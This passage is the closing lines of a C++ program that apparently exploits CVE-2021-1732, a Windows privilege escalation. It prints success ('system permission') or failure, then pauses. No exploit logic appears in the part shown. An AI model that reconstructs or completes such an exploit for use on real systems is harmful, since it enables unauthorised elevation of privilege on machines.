        std::cout << "CVE-2021-1732 Exploit success, system permission" << std::endl;
    }
    else {
        std::cout << "CVE-2021-1732 Exploit fail" << std::endl;
    }
    system("pause");

    return (int)0;
}
